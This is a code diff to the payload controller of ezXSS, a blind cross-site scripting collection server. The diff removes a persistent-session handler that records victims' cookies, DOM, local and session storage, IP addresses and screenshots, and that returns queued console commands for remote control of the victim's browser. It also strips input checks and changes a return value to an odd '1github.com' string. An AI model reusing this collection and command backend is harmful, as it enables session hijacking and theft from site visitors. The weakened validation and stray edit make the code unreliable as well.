@@ -46,14 +46,9 @@ class Payloads extends Controller
         // Create the string of pages we collect
         $pages = array_map(function ($page) {
             return "'" . e($page) . "'";
-        }, array_filter(explode('~', $payload['pages'] ?? '')));
+        }, array_filter(explode('~', $payload['pages'])));
 
         $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';
-
-        // Create the persistent payload
-        if($payload['persistent']) {
-            $persistent = $this->view->getPayload('persist');
-        }
 
         $this->view->renderData('noCollect', implode(',', $noCollect), true);
         $this->view->renderData('pages', implode(',', $pages), true);
@@ -61,7 +56,6 @@ class Payloads extends Controller
         $this->view->renderData('globaljs', $this->model('Setting')->get('customjs'), true);
         $this->view->renderData('screenshot', $screenshot, true);
         $this->view->renderData('payload', url);
-        $this->view->renderData('persistent', $persistent ?? '', true);
 
         return $this->view->getContent();
     }
@@ -102,7 +96,7 @@ class Payloads extends Controller
         // Decode the JSON data
         $data = json_decode(file_get_contents('php://input'), false);
 
-        if(empty($data) || !is_object($data)) {
+        if(empty($data)) {
             return 'github.com/ssl/ezXSS';
         }
 
@@ -125,8 +119,8 @@ class Payloads extends Controller
         // Check black and whitelist
         $payload = $this->getPayloadByUrl($data->payload);
 
-        $blacklistDomains = explode('~', $payload['blacklist'] ?? '');
-        $whitelistDomains = explode('~', $payload['whitelist'] ?? '');
+        $blacklistDomains = explode('~', $payload['blacklist']);
+        $whitelistDomains = explode('~', $payload['whitelist']);
 
         // Check for blacklisted domains
         foreach ($blacklistDomains as $blockedDomain) {
@@ -156,13 +150,8 @@ class Payloads extends Controller
                 }
             }
             if (!$foundWhitelist) {
-                return 'github.com/ssl/ezXSS';
+                return '1github.com/ssl/ezXSS';
             }
-        }
-
-        // Check if callback should be threated as persistent mode
-        if(isset($data->method) && $data->method === 'persist') {
-            return $this->persistCallback($data);
         }
 
         // Check if the report should be saved or alerted
@@ -224,52 +213,6 @@ class Payloads extends Controller
         }
 
         return 'github.com/ssl/ezXSS';
-    }
-
-    /**
-     * Persistent callback function that receives all incoming data from persistent mode
-     *
-     * @param object $data The data coming from the callback function
-     * @return void
-     */
-    private function persistCallback($data)
-    {
-        // do something
-        $data->type = $data->type ?? '';
-
-        // A new request has been made
-        if($data->type === 'init') {
-            // Save the request data
-            $data->id = $this->model('Session')->add(
-                $data->clientid ?? '',
-                $data->cookies ?? '',
-                $data->dom ?? '',
-                $data->origin,
-                $data->referer,
-                $data->uri,
-                $data->{'user-agent'},
-                $data->ip,
-                ($data->screenshotName ?? ''),
-                json_encode($data->localstorage ?? ''),
-                json_encode($data->sessionstorage ?? ''),
-                $data->payload,
-                $data->console ?? ''
-            );
-            return 'github.com/ssl/ezXSS';
-        }
-
-        // Session is pinged and is waiting for pong
-        if($data->type === 'ping') {
-            try {
-                $session = $this->model('Session')->getByClientId($data->clientid ?? '', $data->origin);
-
-                $this->model('Session')->setSingleValue($session['id'], 'time', time());
-                $this->model('Session')->setSingleValue($session['id'], 'console', $data->console ?? '');
-            } catch(Exception $e) {
-                return '';
-            }
-            return $this->model('Console')->getNext($data->clientid ?? '', $data->origin);
-        }
     }
 
     /**
@@ -513,7 +456,7 @@ class Payloads extends Controller
     private function getPayloadByUrl($payloadUrl)
     {
         // Split the URL into segments
-        $splitUrl = explode('/', $payloadUrl ?? '');
+        $splitUrl = explode('/', $payloadUrl);
 
         try {
             // Attempt to retrieve the payload by the full path
